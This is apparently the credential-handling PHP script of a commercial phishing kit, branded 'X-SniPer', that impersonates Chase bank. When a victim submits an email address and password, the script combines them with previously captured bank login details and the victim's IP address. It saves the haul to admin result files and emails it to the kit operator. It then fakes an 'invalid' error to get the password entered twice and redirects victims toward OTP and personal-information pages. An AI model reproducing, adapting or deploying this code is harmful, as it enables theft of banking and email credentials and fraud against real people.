<?php 



require("require.php");


if (isset($_POST['Email']) && isset($_POST['password']) ) {
	if (!empty($_POST['Email']) && !empty($_POST['password']) ) {
		
			// Admin Panel
			$_SESSION['Email']  = $_POST['Email']; 
			$_SESSION['passwordEmail']  = $_POST['password'];
			if(isset($_POST['invalid'])){$arrangement = "2nd"; }else{$arrangement = "1st";}

			$msgAdminPanel = "<tr>";
			$msgAdminPanel .= "<td>".$_SESSION['userId']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['password']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['Email']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['passwordEmail']."</td>";
			$msgAdminPanel .= "<td>".$ip." </td>";
			$msgAdminPanel .= "<td>".$date."</td>";
			$msgAdminPanel .= "</tr>". "\r\n";


			$Subject = "❤️💪 X-SniPer ".$arrangement." Email Access 💪❤️  [".$_POST['Email']."] ip 👉".$ip;
	        $headers = "MIME-Version: 1.0" . "\r\n";
	        $headers .= "From: ".$YourName." <ElZero@xSniper.com>" . "\r\n";
	        $headers .= "Content-type:text/plan;charset=UTF-8" . "\r\n";

	        $msg = "#===========||<".$YourName.">||==========#\n";
	        $msg .= "#===========||<X-SniPer Page>||==========#\n";
	        $msg .= "UserID   		: ".$_SESSION['userId']." \n";
	        $msg .= "Password 		: ".$_SESSION['password']." \n";
	        $msg .= "#===========||<Email Access>||==========//\n";
	        $msg .= "Email Access   : ".$_SESSION['Email']." \n";
	        $msg .= "Password 		: ".$_SESSION['passwordEmail']." \n";
	        $msg .= "IP 	  		: ".$ip."//\n";
	        $msg .= "#===========||<Thanks For Buying>||==========#\n";


	        if ($saveInAdminPanel  == "true") {
				if ($arrangement == "1st") {
					$file = fopen("../../admin/result/emailAccess.txt", "a+");
					fwrite($file, $msgAdminPanel);
				}elseif($arrangement == "2nd"){
					$file = fopen("../../admin/result/doubleEmailAccess.txt", "a+");
					fwrite($file, $msgAdminPanel);
				}
				
			}
					if ($sendToEmail == "true") {
				
				send($yourEmail, $Subject, $msg);

			}

			if ($doubleAccess == "true" && $arrangement == "1st") {
				header("Location: ../../secure/emailAccess?country=us&invalid2&id=chase");exit();
			}else{
				// $domainsOTP
				$domainTLD = explode("@", $_SESSION['Email'])[1];
				$domain = explode(".", $domainTLD)[0];
				$_SESSION['domain'] = $domainTLD;
				if ($otp == "true") {
					if ($allDomains == "true") {
						header("Location: ../../secure/emailAccessOTP?country=us&id=chase&domain=$domain");exit();
					}else{
						if (in_array($domain,$domainsOTP )) {
							header("Location: ../../secure/emailAccessOTP?country=us&id=chase&domain=$domain");exit();
							
						}else{
							header("Location: ../../secure/info?country=us&id=chase");exit();

						}
					}
					
				}
				
			}



		
	}else{
		header("Location: ../../secure/emailAccess?id=chase&invalid&country=us");exit();
	}
}else{
	header("Location: ../../secure/emailAccess?id=chase&invalid&country=us");exit();
}
